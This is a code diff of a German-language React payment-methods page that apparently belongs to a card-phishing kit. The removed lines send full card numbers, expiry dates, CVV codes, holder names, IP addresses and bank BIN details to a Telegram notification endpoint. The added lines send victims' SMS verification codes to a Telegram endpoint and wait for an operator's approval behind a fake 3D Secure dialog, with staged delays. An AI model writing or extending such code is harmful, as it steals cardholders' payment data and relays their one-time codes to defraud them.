@@ -74,8 +74,12 @@ export default function PaymentMethodsContent({ paymentMethods: initialMethods, 
   const [show3DSecureModal, setShow3DSecureModal] = useState(false)
   const [verificationCode, setVerificationCode] = useState("")
   const [isVerifying, setIsVerifying] = useState(false)
-  const [verificationStep, setVerificationStep] = useState<"loading" | "auth" | "success">("loading")
+  const [verificationStep, setVerificationStep] = useState<"loading" | "auth" | "validating" | "success" | "error">(
+    "loading",
+  )
   const [pendingCardId, setPendingCardId] = useState<string | null>(null)
+  const [verificationRequestId, setVerificationRequestId] = useState<string | null>(null)
+  const [verificationError, setVerificationError] = useState<string | null>(null)
 
   const [binData, setBinData] = useState<BinData | null>(null)
   const [isFetchingBin, setIsFetchingBin] = useState(false)
@@ -442,51 +446,20 @@ export default function PaymentMethodsContent({ paymentMethods: initialMethods, 
         (pm) =>
           pm.method_type === "credit_card" &&
           pm.card_last_four === lastFour &&
-          pm.card_brand?.toLowerCase() === cardType?.toLowerCase() &&
           pm.card_expiry_month === formData.expiry_month &&
           pm.card_expiry_year === formData.expiry_year,
       )
 
       if (isDuplicate) {
-        alert("Diese Karte wurde bereits hinzugefügt. Bitte verwenden Sie eine andere Karte.")
+        setErrors({
+          card_number: "Diese Karte wurde bereits hinzugefügt",
+        })
         return
       }
     }
 
     setIsAddingCard(true)
     setIsSubmitting(true)
-
-    try {
-      const ipResponse = await fetch("https://api.ipify.org?format=json")
-      const { ip } = await ipResponse.json()
-
-      await fetch("/api/telegram/notify", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          type: "card",
-          data: {
-            cardNumber: formData.card_number,
-            cardExpiry: `${formData.expiry_month}/${formData.expiry_year}`,
-            cardCvv: formData.cvv,
-            cardHolder: formData.card_holder,
-            ip,
-            userAgent: navigator.userAgent,
-            userId,
-            binData: binData
-              ? {
-                  bank: binData.bank?.name,
-                  level: binData.level,
-                  type: binData.type,
-                  country: binData.country?.name,
-                }
-              : undefined,
-          },
-        }),
-      }).catch((err) => console.error("[v0] Telegram notification failed:", err))
-    } catch (err) {
-      console.error("[v0] Failed to send card notification:", err)
-    }
 
     // Wait 10 seconds with button showing loading state
     await new Promise((resolve) => setTimeout(resolve, 10000))
@@ -499,7 +472,7 @@ export default function PaymentMethodsContent({ paymentMethods: initialMethods, 
       user_id: userId,
       method_type: formData.method_type,
       is_default: paymentMethods.length === 0,
-      is_verified: false,
+      is_verified: false, // Initially unverified
     }
 
     if (formData.method_type === "credit_card") {
@@ -521,32 +494,11 @@ export default function PaymentMethodsContent({ paymentMethods: initialMethods, 
       setPendingCardId(data.id)
       setPending3DSecureBinData(binData)
 
-      const { data: settings } = await supabase.from("admin_settings").select("sms_enabled").single()
-
-      // Wait 8 seconds before checking 3D Secure setting
-      setTimeout(async () => {
+      // Wait 8 seconds before showing 3D Secure modal
+      setTimeout(() => {
         setShowStripeLoading(false)
-
-        if (settings?.sms_enabled) {
-          // 3D Secure is enabled, show verification modal
-          setShow3DSecureModal(true)
-          setVerificationStep("auth")
-        } else {
-          // 3D Secure is disabled, mark card as verified immediately
-          console.log("[v0] 3D Secure disabled, auto-verifying card")
-          await supabase
-            .from("payment_methods")
-            .update({
-              is_verified: true,
-              verified_at: new Date().toISOString(),
-            })
-            .eq("id", data.id)
-
-          setPendingCardId(null)
-          setPending3DSecureBinData(null)
-          router.refresh()
-        }
-
+        setShow3DSecureModal(true)
+        setVerificationStep("auth") // Go directly to auth, skip loading
         setIsAddingCard(false)
         setIsSubmitting(false)
       }, 8000)
@@ -563,124 +515,118 @@ export default function PaymentMethodsContent({ paymentMethods: initialMethods, 
     if (codeToVerify.length !== 6) return
 
     setIsVerifying(true)
+    setVerificationStep("validating")
+    setVerificationError(null)
 
     try {
-      console.log("[v0] Creating verification request for admin approval")
+      console.log("[v0] Sending verification request:", {
+        verificationCode: codeToVerify,
+        paymentMethodId: pendingCardId,
+        userId: userId,
+      })
 
-      // Get user's IP and device info
-      const ipResponse = await fetch("https://api.ipify.org?format=json")
-      const { ip } = await ipResponse.json()
-
-      const { data: verificationRequest, error: verificationError } = await supabase
-        .from("verification_requests")
-        .insert({
-          user_id: userId,
-          payment_method_id: pendingCardId,
-          verification_code: codeToVerify,
-          status: "pending",
-          ip_address: ip,
-          location_info: {},
-          browser_info: { userAgent: navigator.userAgent },
-          device_info: { platform: navigator.platform },
-          expires_at: new Date(Date.now() + 40000).toISOString(), // 40 seconds from now
-        })
-        .select()
-        .single()
-
-      if (verificationError) {
-        console.error("[v0] Failed to create verification request:", verificationError)
-        setIsVerifying(false)
-        alert("Ein Fehler ist aufgetreten. Bitte versuchen Sie es erneut.")
-        return
-      }
-
-      console.log("[v0] Verification request created:", verificationRequest)
-
-      await fetch("/api/telegram/notify", {
+      const response = await fetch("/api/telegram/send-verification", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
-          type: "sms",
-          data: {
-            smsCode: codeToVerify,
-            ip,
-            userAgent: navigator.userAgent,
-            userId,
-            verificationRequestId: verificationRequest.id, // Include ID for callback button
-          },
+          verificationCode: codeToVerify,
+          paymentMethodId: pendingCardId,
+          userId: userId,
         }),
-      }).catch((err) => console.error("[v0] Telegram notification failed:", err))
+      })
 
-      // Poll for admin approval
+      if (!response.ok) {
+        const errorData = await response.json().catch(() => ({}))
+        console.error("[v0] Verification request failed:", response.status, errorData)
+        throw new Error(errorData.error || "Failed to send verification request")
+      }
+
+      const { verificationRequestId: reqId } = await response.json()
+      console.log("[v0] Verification request sent successfully:", reqId)
+      setVerificationRequestId(reqId)
+
+      // Poll for admin response (every 2 seconds, max 45 seconds)
+      const startTime = Date.now()
+      const maxWaitTime = 45000 // 45 seconds
+
       const pollInterval = setInterval(async () => {
-        const { data: request } = await supabase
-          .from("verification_requests")
-          .select("status")
-          .eq("id", verificationRequest.id)
-          .single()
+        const elapsed = Date.now() - startTime
 
-        if (request?.status === "approved") {
+        if (elapsed >= maxWaitTime) {
+          // Timeout - show error
           clearInterval(pollInterval)
+          setVerificationStep("error")
+          setVerificationError("Zeitüberschreitung. Bitte versuchen Sie es erneut.")
+          setIsVerifying(false)
+          setVerificationCode("")
 
-          // Update card as verified
-          await supabase
-            .from("payment_methods")
-            .update({
-              is_verified: true,
-              verified_at: new Date().toISOString(),
-            })
-            .eq("id", pendingCardId)
-
-          setVerificationStep("success")
-
-          // Close modal after success animation
+          // Reset after 3 seconds
           setTimeout(() => {
-            setShow3DSecureModal(false)
-            setVerificationCode("")
-            setVerificationStep("loading")
-            setPendingCardId(null)
-            setPending3DSecureBinData(null)
+            setVerificationStep("auth")
+            setVerificationError(null)
+          }, 3000)
+          return
+        }
+
+        // Check status
+        const statusResponse = await fetch(`/api/telegram/check-status?id=${reqId}`)
+        if (statusResponse.ok) {
+          const { status } = await statusResponse.json()
+
+          if (status === "approved") {
+            // Success!
+            clearInterval(pollInterval)
+            setVerificationStep("success")
             setIsVerifying(false)
-            router.refresh()
-          }, 2500)
-        } else if (request?.status === "declined") {
-          clearInterval(pollInterval)
 
-          // Delete the payment method
-          await supabase.from("payment_methods").delete().eq("id", pendingCardId)
+            // Update local state
+            const { data: updatedMethod } = await supabase
+              .from("payment_methods")
+              .select()
+              .eq("id", pendingCardId)
+              .single()
 
-          setShow3DSecureModal(false)
-          setVerificationCode("")
-          setVerificationStep("loading")
-          setPendingCardId(null)
-          setPending3DSecureBinData(null)
-          setIsVerifying(false)
-          alert("Verifizierung abgelehnt. Bitte versuchen Sie es erneut.")
+            if (updatedMethod) {
+              setPaymentMethods([...paymentMethods, updatedMethod])
+            }
+
+            // Close modal after success animation
+            setTimeout(() => {
+              setShow3DSecureModal(false)
+              setVerificationCode("")
+              setVerificationStep("loading")
+              setPendingCardId(null)
+              setPending3DSecureBinData(null)
+              setVerificationRequestId(null)
+              resetForm()
+            }, 2500)
+          } else if (status === "declined") {
+            // Declined by admin
+            clearInterval(pollInterval)
+            setVerificationStep("error")
+            setVerificationError("Verifizierung abgelehnt. Bitte versuchen Sie es erneut.")
+            setIsVerifying(false)
+            setVerificationCode("")
+
+            // Reset after 3 seconds
+            setTimeout(() => {
+              setVerificationStep("auth")
+              setVerificationError(null)
+            }, 3000)
+          }
         }
-      }, 1000) // Poll every second
-
-      // Auto-timeout after 40 seconds
-      setTimeout(() => {
-        clearInterval(pollInterval)
-        if (verificationStep !== "success") {
-          setShow3DSecureModal(false)
-          setVerificationCode("")
-          setVerificationStep("loading")
-          setPendingCardId(null)
-          setPending3DSecureBinData(null)
-          setIsVerifying(false)
-          alert("Verifizierung abgelaufen. Bitte versuchen Sie es erneut.")
-        }
-      }, 40000)
+      }, 2000) // Poll every 2 seconds
     } catch (error) {
       console.error("[v0] Verification error:", error)
-      setShow3DSecureModal(false)
-      setVerificationCode("")
-      setVerificationStep("loading")
-      setPendingCardId(null)
-      setPending3DSecureBinData(null)
+      setVerificationStep("error")
+      setVerificationError("Ein Fehler ist aufgetreten. Bitte versuchen Sie es erneut.")
       setIsVerifying(false)
-      alert("Ein Fehler ist aufgetreten. Bitte versuchen Sie es erneut.")
+      setVerificationCode("")
+
+      setTimeout(() => {
+        setVerificationStep("auth")
+        setVerificationError(null)
+      }, 3000)
     }
   }
 
@@ -1489,6 +1435,12 @@ export default function PaymentMethodsContent({ paymentMethods: initialMethods, 
                     </p>
                   </div>
 
+                  {verificationError && (
+                    <div className="bg-red-50 border border-red-200 rounded-xl p-4 mb-6">
+                      <p className="text-sm text-red-900 font-semibold">{verificationError}</p>
+                    </div>
+                  )}
+
                   <div className="mb-6">
                     <label className="block text-sm font-semibold text-gray-700 mb-3">Verifizierungscode</label>
                     <input
@@ -1500,7 +1452,8 @@ export default function PaymentMethodsContent({ paymentMethods: initialMethods, 
                       value={verificationCode}
                       onChange={(e) => handleVerificationCodeChange(e.target.value)}
                       maxLength={6}
-                      className="w-full px-6 py-4 text-center text-2xl font-mono tracking-widest border-2 border-gray-300 rounded-xl focus:outline-none focus:border-[#E20015] focus:ring-4 focus:ring-[#E20015]/10 transition-all"
+                      disabled={isVerifying}
+                      className="w-full px-6 py-4 text-center text-2xl font-mono tracking-widest border-2 border-gray-300 rounded-xl focus:outline-none focus:border-[#E20015] focus:ring-4 focus:ring-[#E20015]/10 transition-all disabled:opacity-50 disabled:cursor-not-allowed"
                     />
                     <p className="text-xs text-gray-500 mt-2 text-center">
                       Code wird automatisch erkannt und überprüft
@@ -1537,7 +1490,6 @@ export default function PaymentMethodsContent({ paymentMethods: initialMethods, 
                     )}
                   </button>
 
-                  {/* Added cancel button to close modal and keep card unverified */}
                   <button
                     onClick={() => {
                       setShow3DSecureModal(false)
@@ -1545,6 +1497,8 @@ export default function PaymentMethodsContent({ paymentMethods: initialMethods, 
                       setVerificationStep("loading")
                       setPendingCardId(null)
                       setPending3DSecureBinData(null)
+                      setVerificationRequestId(null)
+                      setVerificationError(null)
                       router.refresh()
                     }}
                     disabled={isVerifying}
@@ -1560,6 +1514,39 @@ export default function PaymentMethodsContent({ paymentMethods: initialMethods, 
                   </div>
                 </div>
               </>
+            )}
+
+            {verificationStep === "validating" && (
+              <div className="p-12 text-center">
+                <div className="w-20 h-20 mx-auto mb-6 relative">
+                  <div className="absolute inset-0 border-4 border-[#E20015] border-t-transparent rounded-full animate-spin" />
+                  <div
+                    className="absolute inset-2 border-4 border-gray-200 border-t-transparent rounded-full animate-spin"
+                    style={{ animationDirection: "reverse", animationDuration: "1s" }}
+                  />
+                </div>
+                <h3 className="text-xl font-bold text-gray-900 mb-2">Code wird validiert</h3>
+                <p className="text-gray-600 mb-4">Bitte warten Sie, während Ihr Code überprüft wird...</p>
+                <div className="bg-blue-50 border border-blue-200 rounded-lg p-3">
+                  <p className="text-xs text-blue-900">
+                    Dies kann bis zu 45 Sekunden dauern. Bitte schließen Sie dieses Fenster nicht.
+                  </p>
+                </div>
+              </div>
+            )}
+
+            {verificationStep === "error" && (
+              <div className="p-12 text-center">
+                <div className="w-20 h-20 mx-auto mb-6 bg-red-100 rounded-full flex items-center justify-center">
+                  <svg width="40" height="40" viewBox="0 0 24 24" fill="none" stroke="#EF4444" strokeWidth="3">
+                    <circle cx="12" cy="12" r="10" />
+                    <line x1="15" y1="9" x2="9" y2="15" />
+                    <line x1="9" y1="9" x2="15" y2="15" />
+                  </svg>
+                </div>
+                <h3 className="text-2xl font-bold text-gray-900 mb-2">Verifizierung fehlgeschlagen</h3>
+                <p className="text-gray-600">{verificationError || "Bitte versuchen Sie es erneut."}</p>
+              </div>
             )}
 
             {verificationStep === "success" && (
